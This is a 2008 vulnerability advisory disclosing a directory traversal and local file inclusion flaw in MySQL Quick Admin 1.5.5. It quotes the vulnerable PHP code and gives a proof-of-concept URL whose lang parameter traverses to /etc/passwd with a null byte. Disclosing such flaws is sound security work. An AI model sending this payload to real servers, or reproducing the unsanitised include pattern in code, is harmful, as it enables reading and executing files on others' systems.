MySQL Quick Admin 1.5.5 Local File Inclusion Vulnerability
==========================================================


##################################################################################
#										 #		
#		Author:	Vinod Sharma						 #
#		Date:	05th Nov, 2008						 #
#		Note: 	This information is only for educational purpose, author # 
#			will not bear responsibility for any damages. 		 #
##################################################################################


#########################################################################################
#Directory traversal vulnerability in MySQL Quick Admin 1.5.5 				#
#allows remote attackers to read and execute arbitrary files via a .. (dot dot) 	#
#in the lang parameter to actions.php.							#
#											#
#											#
#											#
#Appplication still unpatched								#
#											#
#vulnerable code in actions.php								#
# 											#				
#/* code start										#
#    case 27:										#
#         $do = $_GET[&#039;do&#039;];								#
#         if($do == "theme" && file_exists("themes/".$_GET[&#039;theme&#039;])){			#
#             setcookie(&#039;theme&#039;, $_GET[&#039;theme&#039;], time()+60*60*24*30);			#
#             $_SESSION[&#039;theme&#039;] = $_GET[&#039;theme&#039;];					#
#             unset($_SESSION[&#039;theme_name&#039;]);						#
#         } else if($do == "lang" && file_exists("lang/".$_GET[&#039;lang&#039;])){		#
#             setcookie(&#039;language&#039;, $_GET[&#039;lang&#039;], time()+60*60*24*30);			#
#             $_SESSION[&#039;language&#039;] = $_GET[&#039;lang&#039;];					#
#             unset($_SESSION[&#039;lang_name&#039;]);						#
#         }										#
#         header("Location: main.php");							#
#											#
#/* code end										#
#											#	
#$_SESSION[&#039;language&#039;] is set to the value of the lang parameter without any 		#
#sanitization.										#
#											#
#The actions.php will send this $_SESSION[&#039;language&#039;] value to required.php which will 	#
#pass it to include() function without any sanitization. 				#
#											#
#											#
#vulnerable code in required.php							#
#											#
#/* code start 										#
#											#
#line 22 in required.php:  include("lang/".$_SESSION[&#039;language&#039;]."/lang.php");		#			
#											#
#/* code end										#
#########################################################################################


POC:http://www.example.com/quickadmin/actions.php?act=27&do=lang&lang=../../../../../../../../../../etc/passwd%00


#########################################################################################



